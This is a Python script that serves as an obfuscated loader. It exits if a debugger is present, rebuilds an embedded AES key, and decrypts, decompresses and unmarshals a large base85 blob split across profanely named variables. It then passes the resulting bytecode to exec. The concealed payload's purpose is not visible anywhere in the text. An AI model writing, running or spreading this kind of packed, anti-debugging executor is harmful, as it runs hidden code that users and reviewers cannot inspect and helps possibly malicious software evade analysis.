# Encrypted By: @MU_BULLET
import sys as BULLET_SYS, os as BULLET_OS, base64 as BULLET_B64, marshal as BULLET_MAR, zlib as BULLET_Z, traceback as BULLET_TB
from Crypto.Cipher import AES as BULLET_AES
from Crypto.Util.Padding import unpad as BULLET_UNPAD

def BULLET_ANTIDEBUG():
    if BULLET_SYS.gettrace() or (BULLET_OS.name == 'nt' and __import__('ctypes').windll.kernel32.IsDebuggerPresent()):
        BULLET_SYS.exit(0)
BULLET_ANTIDEBUG()

BULLET_IV = b'\x0ba\xa8\xab\xc8\xd1y\x8e\xa07\r=U\xf2\r\xf7'
BULLET_KEY_PARTS = [
    b'zV\x98S', b'\xb5\xa5#3', b'\xa9^\x95;', b'=s\xb4\x14',
    b'\xf6k5C', b'"7\xea\xaf', b'!h-\xcf', b'\xbaB\xc5\xc2'
]
BULLET_KEY = b''.join(BULLET_KEY_PARTS)

def BULLET_DECRYPT(data):
    try:
        return BULLET_UNPAD(BULLET_AES.new(BULLET_KEY, BULLET_AES.MODE_CBC, BULLET_IV).decrypt(data), 16).decode()
    except:
        return ""

FUCK_U_KIDS_0 = '&j`vZ32@&aHg1McUzfrD$YjKvLew%!mqfbEY%Dqa`=?k{Y0c+#oY;A=fKo_{Fxx^%t&f%{7R(OgSl6zov4H8EmZol~DFjv893kYliokHk%a(z=4EI^D=%)v<##U9h@?uu;<L%M!7_NOA3}gn|<wf%t'
FUCK_U_KIDS_1 = 'Mb023pu%Sn&JoLC7nZP&ssY@;AxIly@;N36S9`)6&vejxggHfB@VmNrzuwBKesde;I74NVpK=4JghC@mbl+iFTi+i^fMEEs;`2%P4FH?H3YVd~b?#l=7z2>4ZTWP=>}_mNSB%!!Z4=ptIP-+}@Oxfm'
FUCK_U_KIDS_2 = '5Z~&CU~3`1!SvI#L|7|k(AoGhP+(@v`!V-?ICVMOo5IEPG2PbHK@D}^xMv6P(8luBn~+kz_d2S^*TEhF7qvP7d2dZ56l8_UkoT*|)AcBCJ7I-~zGh+It*uG+K)Xftw{;jMjK^#~@?Ff`iV3U^fH4c3'
FUCK_U_KIDS_3 = 'evf>?qCL$8gd)}TlnR{@M-mjucFM<`PQSg?hW6DBK$osZQ(~AICk(^<Eo^9-lvg^Q^OLVILaZ&#hKnH|jS4OyWqS)Y+>}dOb^4NGzGNkpo*K3-SQqhsKDCVRl~Lnkv3-uOmc1Oh+YTBd6xiJV7Dc&b'
FUCK_U_KIDS_4 = 'ea|ffUdQ2x?-fKQR7Hy*Lw~WCv9OHR{i|(sfH29RqRuKob>_&2{>T<v>bl%gj@){b8Vs0fzE-BK`>2s7Qv7vkdelJYA$dAzzZ|P_WI^712m~a4&q{jwX*Z;HY>7_!Bb;WGb}-z;!X&o-_x2CEQ!=ku'
FUCK_U_KIDS_5 = '%%$Ofcabz{ZuTD;-v(Q(j-i8P+y`?q=C+L;CH@&}43sEuXyC6nlr%WmYY2%a1XVypu1a*mT_lajF0L~z*o+=J<LnH3J7fHt)*EIP-|D3Q{qQ}d)>Y_0*hZ#~_h>rrfvN%=;2CF<qSn{S!(R$pg;EXM'
FUCK_U_KIDS_6 = 'RZe9r-1-kYJ(gbXQYk6BrkZf#Q4X9;<FDpc(Adp7DhLSpbK^=|$rv0b;`J8TJJm=5x8<x$7U9Nds)2$GHQyy@IquCY-5i2OvAJ>KUez%C|C61DwqtyM>7MaV#p!d?c*k0vH;T&K_za?gr?3Q(EnG_E'
FUCK_U_KIDS_7 = 'q3~zA0P!)l$GXf--0DZFb%l%q?5y>80Gd7@yM7Tj^S-&B9c9*+rU7!tHVgHiy=5|38AmE2iimw&kNn;fCtl}9Hu8%&D8KF7hMA_4I_k<m>>NZxb>xX^kg`HA4pCR(?UeEaL8o)ZYdvk4gM?GOxu8^}'
FUCK_U_KIDS_8 = 'X9<grk!=!-8@EO<w_JmbP|?skSK-aCh6SC!R3Ymg*|xv_cgnal?cKx4ci*{%e6UF>o{9x13MzzGS5@R1=u+A~^mGS|&eVI;SnfzNE~Q7Qt4&?6RHa2Na0(#Yew-culZd6;C!*liIuv&Go`WHE$V;l1'
FUCK_U_KIDS_9 = 'k0|CEpwO$9k<iGAuTlhhepP0v$nvD)=l{~8Bb^zsW;(f>g@W><eG3<It3-h-Je$SWZ&x^{<v3V6y?a{{80XIxZJ9b@J^b!@FyNTY$iLNuagX2y)BvGh;0||}qR{xl&!63bZ|rP|$3bt=VS|_aMqu$k'
FUCK_U_KIDS_10 = 'iYS_cXG9R}oUYt9yv{_HtR=R|iKa#NI%n;=%Qg}n>}2hcU$#+&R6X5!qr-XS>|KB=WF|me8&gsFB)E0SHtp#C%c0BvvQi)d8^oYcz|cqKZc`02&G#KJQ5mNv!k7~jp?o5`t|*AjYorpLli%7x`*(HP'
FUCK_U_KIDS_11 = 'l<;VM2W}wE;u&u2N&S6<#{rxWqMB2EI0dsETsr7>#s~0hZ+3ld7(B?+GjOM?M*oNbm))f##8}f?0Kd^K7DYb>zoTz~JF{$xBj7PW+`^LLS~9Y!3eu+o<IF`?f+X*%75~S(Sx!xPjaXKtwOUlsD@D(S'
FUCK_U_KIDS_12 = 'ko6`f@DquPMEpor52Xc+Zfy>?O`d?Zmmahpak)Zhj#Y$^oLW?2ey)B~m$gf3IJA4Xj41yBpc*Bn{#P*J-F|q;xSE`gEt{hv<Mw{ceLXwG*2RnU6=Aj2AWj`;|K_{VESJ?jw?l+*0+6xT<tZeqX$jcE'
FUCK_U_KIDS_13 = 'wSh|8B%^r6#KM&Khy2GggeGJ`j*JI{I;<@s_-M67SEwRl)^BGVP9|)2x%iDz=L{F7f0b7JrkwhmS86PW+&L(0$yz-)3C%eCSBjW0GQvS2Dr@nsS`3@54RW4H;bmUaD7v6Oop~3p_0jKDc!?$BP{?uC'
FUCK_U_KIDS_14 = '%u$#HcJrUAi@ZP1*yk{+%~{zUbuU-VoCqCVPl&tCb)YSOVV02*4bL~3u-d?@5Jqv^bTqu}iZ9dKPLRdApQL}2;=xZMNHONqHvADMz+wM!CC;H2wat32I-5AM(YMhT_<oWE<2A^(iL3O4!kUbTB3f8~'
FUCK_U_KIDS_15 = '8Ug~Z6#yW|vMO@se>q8%;^BvEzOV~?0OeR4V4GTRq131@fx*WkpENbbgoY8pag3mQx_}ezT~wNaWn5#bPG+JR9AnPFB!N<71$`8pmQD^!r0Ab<&d<v<LGtRUo@{%y1N~B2Sy*f*M}kn{JF+#>$<8On'
FUCK_U_KIDS_16 = 'gqsp1C#(`}r2@+K)bOaNK=b*10E^S+VH5**Iq5sNG+fXL3GMx!^rO~_CU;9v6dR`z;<OJH1u_t@_z}2Ng+S8aR|R>hsw;KmJ#|&a`+WJW`_(Sr8I2=7jzPh0nqHza*any<MeAx786DWI!VEL#0k{68'
FUCK_U_KIDS_17 = '_Rt~U*1wPeF^5N#Zv$(GS0!t1$OaPIwQy){&ov#BK9!Zr8z5fO4S7N`H)TwrPyiCE)s;V+#00&0oUOdsor%x*aj;M{JkO8BtR6*<iB3`E*rPI=ZFMY%3jcYZ07lV*Ckp(!F!WW&wUO}8$Oq-6q95>o'
FUCK_U_KIDS_18 = 'Z^X+=TV3|7Rlm?J1hZ<}US|`XNsS==yf|FCsO}eeESg318E@FnBLBF8R5z&MbVVNw541%Kp$LJ|vri*wQwJ*7%7|xKVc8EkotupK<H03MFBM)lMYPZ=eAits*Ob^bU-8?;&wY@`3RM>Wp$17xn?RJp'
FUCK_U_KIDS_19 = 'qh?kIIIslYKLMUC^g;P@w7B__onY>L>(RG_u72&{Q~s?SU?ziwRhU-(kTi>(Po`ql3MKb%`dB@jBjqvgbHc$u<b~!CXs~l@svPO<nEzon-K_-#WLQHQ5hZyj%#v9y>bWh<@5icpg*LPA^smfWnb7Gj'
FUCK_U_KIDS_20 = '4v)H<bi~kS+vj_^);^4UjdH`1xc#^Nuc1hfHo0J71XrkS7hTqr&U)G_+U66_?57AfsLM(6BArUy_VgNY9Pbxwi%!bY%BfInu2IjK&7s`8InPjgb!+~U8ioiROl|2h*z*CHE0W9a5ACHEOZgL}T)34S'
FUCK_U_KIDS_21 = 'F^Lgq5K9O~#eTX|v*WSZQ?LREpF3%d6l|i&Qt><`Ze1dha1(IOf;{?MkB)_w-XB~w12H%T)&{sS84Z1_vHnuytBs4%zo>q~@V49i?GpRDUQ4d)w!EO6e+?Um)-M)Z?xOasgCw>C=|*}Z-sHQ*v@xH;'
FUCK_U_KIDS_22 = '0_~PB>U5y_9Ib8(K*)$7viM8Jue8%3A|SK2zo8Q6xK$K~_IMK}0Th88cFW3vT<=ilGt~HOZ%>vk5*V+z^6jI0=0{8)bi|6%v8zzXd|9tO5=|sLFHbVpQ;P95;H#BtR2mz?Kk5PYS#OS;55j+@S@JOq'
FUCK_U_KIDS_23 = '<ua}_S7^PiYdB~Wd=AHhGmp+Jq-OK1I3gpxS%}X7cUQz2bPT^qL!K}NWUI%LeP|cOfde{CIhMe8We=<zBS95F)4^jqFG<g3-C?DTfSq^CUaflKf<lUT2s7W*8Y|b$)rjfOWY+?OPZA8POMmZv6v3@2'
FUCK_U_KIDS_24 = '5iJw4JShbeR=Au)gIdt;z!*I0g@Ik%7}`HL$25{zCwd?FAEZ((CS<H#xd}X~Oyvw~+fgC<|07j@xQ-<ByvnlFR-sy{GG`O8cnMIpTB^<*Pnrp!KOiKa2^QkW&Yeqm5CVLIxjIt1V&wmo);MQ3e98f('
FUCK_U_KIDS_25 = 'bQj~CHGumK3;=XNixvWj^ka1C@W>WJw9b$8%Jmz`NP`DdJi<;3yov50c`|Ai1Y9H<{$oulGrzxJc!PZ*W$k-QW+y;aZwOUB(dN187W<|?Na4WFplY+X=o4@n*<lW{SG-e@-d{ar-0Dl%-j9GT-V~Hr'
FUCK_U_KIDS_26 = '41M6$QI~n=)+#CxR2Azlw*j>zf@HuT1STBqso*J}dI)Squ13l=h&%_Fr^(Q)6xx-A-4px(q!5em5|;eW5@db*vWYK{^kxP$#6mk{!HOdP{xl@Mh-x&S@IPc@`G!XM9`0fiUY1Y_fr5w~hs=>;Dc>Fi'
FUCK_U_KIDS_27 = '+u$g;&;Ms8`A;{`Kx|TMFu-(bWwVG+L46FQqHIp?5}3v^!`BoKHii8;^9kiyu}*dfye3q`O}VD{Z$Pr<SD!UtIb8s9N=(gFJ$AI05r=f8QJx0jH7;bg&8!VqCd+e^0@o+G-DV0qyYg;@IJqU#zI1Ua'
FUCK_U_KIDS_28 = 'HU>1|aAIe3o|YsRaBhD->KX_<Nh~e1(i|>+3s)@AO4Kdhw%*<Z))8TaUjf_IQGLGSLS=X7=Gn`&z<G522PL+%K4^`>UKZ6-o;frzqez$^(;Ak4y{;WC!zYTi4CX|ah`7^sp0T9Ah*&0Njcbbj{+~K-'
FUCK_U_KIDS_29 = '9}do6G7d>ofr+fMHYl>c3izx#)HK<e$19xi&6PWewG3Qlq<<USwMlFpW)AT?!*(Zvc_5HRqjEHg7ot-m+W}4L^9%0ff6jaYcksCE%9TX!umH#K8PS%3|NEmi@doWdRg|NUZOKQ9N2OdUZ2}&OVp6zm'
FUCK_U_KIDS_30 = 'EnGWsH<HVKR=QJI8S|4KGp=?|!Xt|%JrqA8KH`piTfyhElH8Z;|6i^K`g~gKpRAHRs$V>EcHF%X<34DpWA}^b42EpyR&eqRtS5V@3PsgZ_w}gDd^-a^5w49>@wL6>SB&P<j-k=zg`V!AQANHc8o7Fd'
FUCK_U_KIDS_31 = 'u-qf)_ipgu^&WA4RFUi)umd`m^-Q^^<5&(MqLh)%jIuIb_9neA^thC5Wx>bm9r*dgSnDbX=hc(u1>tr9Gur0Y5YU5u_f5T^#LTpqOH-G9L;$}@W%hZ0yi>l2y|LNT-c=&hL?j@I=+(lyq+B(%tm@Td'
FUCK_U_KIDS_32 = 'zwgWgUw8`gn7F>25uIC7TC{v$$!H};RM((ly6%}+mS?-gnNKQ|D*%jIrg9es_Z<fCnhqcHv#A9*=fmq!i6s39L|&)YC&d$(lK)VF_I&H!;V``qGlCnDB#YXbyp(k0DOn#(0?9K=EqjxgV>SYMXAz<F'
FUCK_U_KIDS_33 = 'uQaTDvU0*-lmjdsBc}2HZriIA(bFUa27Di6o4xp;d$xnffC)&gN90Te8#eQQl`#)djN${-b$eLz?!ygU2t1MC^mpw$KG<9_TSrh*h`5Hd$R0vNi@E|CN2qVgNSuL|J@fRfkZizDaHlJ?1X8SYzOtZe'
FUCK_U_KIDS_34 = 'Siqt^k3M1?qs>-aZbGu`*YmWdhROV<)H6o>NWyKD)NeD`C85|`#|CW1?h64F^yjJCAkalqHjF43l0}Y3tumc*mw*l2x|JA#5%{@dv`t&}G0u~qH=r;>VjvE~WL0Xu;1+(MA^3C1=fQ?w'
BULLET_ENCRYPTED = "".join([FUCK_U_KIDS_0, FUCK_U_KIDS_1, FUCK_U_KIDS_2, FUCK_U_KIDS_3, FUCK_U_KIDS_4, FUCK_U_KIDS_5, FUCK_U_KIDS_6, FUCK_U_KIDS_7, FUCK_U_KIDS_8, FUCK_U_KIDS_9, FUCK_U_KIDS_10, FUCK_U_KIDS_11, FUCK_U_KIDS_12, FUCK_U_KIDS_13, FUCK_U_KIDS_14, FUCK_U_KIDS_15, FUCK_U_KIDS_16, FUCK_U_KIDS_17, FUCK_U_KIDS_18, FUCK_U_KIDS_19, FUCK_U_KIDS_20, FUCK_U_KIDS_21, FUCK_U_KIDS_22, FUCK_U_KIDS_23, FUCK_U_KIDS_24, FUCK_U_KIDS_25, FUCK_U_KIDS_26, FUCK_U_KIDS_27, FUCK_U_KIDS_28, FUCK_U_KIDS_29, FUCK_U_KIDS_30, FUCK_U_KIDS_31, FUCK_U_KIDS_32, FUCK_U_KIDS_33, FUCK_U_KIDS_34])

def BULLET_RUN():
    try:
        raw = BULLET_B64.b85decode(BULLET_ENCRYPTED.encode())
        decrypted = BULLET_UNPAD(BULLET_AES.new(BULLET_KEY, BULLET_AES.MODE_CBC, BULLET_IV).decrypt(raw), 16)
        payload = BULLET_Z.decompress(decrypted)
        exec(BULLET_MAR.loads(payload), {'__name__': '__main__', '__builtins__': __builtins__, '__decode_x': BULLET_DECRYPT})
    except Exception:
        BULLET_TB.print_exc()
        BULLET_SYS.exit(1)

BULLET_RUN()
